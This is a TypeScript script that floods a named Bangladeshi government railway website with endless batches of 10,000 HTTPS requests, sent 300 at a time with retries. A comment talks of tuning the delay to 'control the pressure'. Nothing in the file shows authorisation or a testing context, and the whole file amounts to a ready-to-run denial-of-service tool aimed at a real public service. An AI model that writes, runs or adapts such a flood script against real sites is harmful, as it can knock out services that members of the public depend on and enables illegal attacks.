import https from "https";
import { URL } from "url";

const targetUrl = "https://railapp.railway.gov.bd";
const totalRequests = 10000;
const concurrency = 300; // Max parallel requests
const maxRetries = 3;

const urlObj = new URL(targetUrl);

const agent = new https.Agent({
  keepAlive: true,
  maxSockets: concurrency,
});

interface Stats {
  success: number;
  failed: number;
  retries: number;
}

async function makeRequest(index: number, attempt = 0): Promise<"success" | "failed"> {
  return new Promise<"success" | "failed">((resolve) => {
    const options = {
      hostname: urlObj.hostname,
      path: urlObj.pathname + urlObj.search,
      method: "GET",
      agent,
    };

    const req = https.request(options, (res) => {
      res.on("data", () => {}); // consume data
      res.on("end", async () => {
        if (res.statusCode && res.statusCode >= 200 && res.statusCode < 400) {
          console.log(`✅ [${index}] Status: ${res.statusCode} (Attempt ${attempt + 1})`);
          resolve("success");
        } else {
          console.warn(`⚠️ [${index}] Bad status: ${res.statusCode} (Attempt ${attempt + 1})`);
          if (attempt < maxRetries) {
            // Retry recursively with await to flatten promises
            const result = await makeRequest(index, attempt + 1);
            resolve(result);
          } else {
            resolve("failed");
          }
        }
      });
    });

    req.on("error", async (err) => {
      console.error(`❌ [${index}] Error: ${err.message} (Attempt ${attempt + 1})`);
      if (attempt < maxRetries) {
        const result = await makeRequest(index, attempt + 1);
        resolve(result);
      } else {
        resolve("failed");
      }
    });

    req.end();
  });
}

async function runBatch(): Promise<Stats> {
  const stats: Stats = { success: 0, failed: 0, retries: 0 };
  let runningPromises: Promise<"success" | "failed">[] = [];

  for (let i = 0; i < totalRequests; i++) {
    // The original promise that returns "success" or "failed"
    const promise = makeRequest(i);

    // Attach side effect without changing the original promise type
    promise.then((result) => {
      if (result === "success") stats.success++;
      else if (result === "failed") stats.failed++;
      else stats.retries++; // Shouldn't happen with current code
    });

    runningPromises.push(promise);

    if (runningPromises.length >= concurrency) {
      await Promise.all(runningPromises);
      runningPromises = [];
      console.log(`Progress: ${i + 1}/${totalRequests} requests dispatched.`);
    }
  }

  if (runningPromises.length > 0) {
    await Promise.all(runningPromises);
  }

  return stats;
}

async function startForever2() {
  while (true) {
    console.log(`Starting batch of ${totalRequests} requests with concurrency ${concurrency}...`);
    const stats = await runBatch();
    console.log(`Batch complete! Success: ${stats.success}, Failed: ${stats.failed}`);
    // Adjust delay as needed to control the pressure
    await new Promise((r) => setTimeout(r, 100));
  }
}

startForever2().catch((e) => console.error("Fatal error:", e));
